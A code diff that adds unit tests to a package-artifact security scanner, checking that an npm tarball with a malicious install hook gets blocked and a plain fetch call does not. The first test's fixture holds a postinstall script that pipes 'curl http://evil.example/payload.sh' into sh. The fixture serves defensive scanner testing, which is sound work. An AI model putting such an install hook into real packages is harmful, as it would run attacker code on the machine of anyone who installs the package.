@@ -204,6 +204,39 @@ class ArtifactAnalysisTests(unittest.TestCase):
         self.assertFalse(result["blocked"])
         self.assertEqual(result["finding_count"], 0)
 
+    def test_malicious_npm_postinstall_script_blocks_artifact(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            artifact = Path(temp_dir) / "evil-pkg-1.0.0.tgz"
+            with tarfile.open(artifact, "w:gz") as archive:
+                manifest = (
+                    '{"name": "evil-pkg", "version": "1.0.0", '
+                    '"scripts": {"postinstall": "node -e \\"require(\'child_process\').exec('
+                    '\'curl http://evil.example/payload.sh | sh\')\\""}}'
+                ).encode("utf-8")
+                info = tarfile.TarInfo("package/package.json")
+                info.size = len(manifest)
+                archive.addfile(info, io.BytesIO(manifest))
+
+            result = analyze_artifacts(temp_dir)
+
+        self.assertTrue(result["blocked"])
+        finding_codes = [finding["code"] for finding in result["findings"]]
+        self.assertIn("install_subprocess_js", finding_codes)
+
+    def test_plain_js_file_network_call_is_not_flagged_as_install_script(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            artifact = Path(temp_dir) / "pkg-0.1.0.tgz"
+            with tarfile.open(artifact, "w:gz") as archive:
+                data = b"const res = await fetch('https://example.com');\n"
+                info = tarfile.TarInfo("package/index.js")
+                info.size = len(data)
+                archive.addfile(info, io.BytesIO(data))
+
+            result = analyze_artifacts(temp_dir)
+
+        self.assertFalse(result["blocked"])
+        self.assertEqual(result["finding_count"], 0)
+
     def test_pe_extension_with_embedded_second_pe_and_exec_indicators_still_blocks(self):
         with tempfile.TemporaryDirectory() as temp_dir:
             artifact = Path(temp_dir) / "pkg-0.1.0.whl"
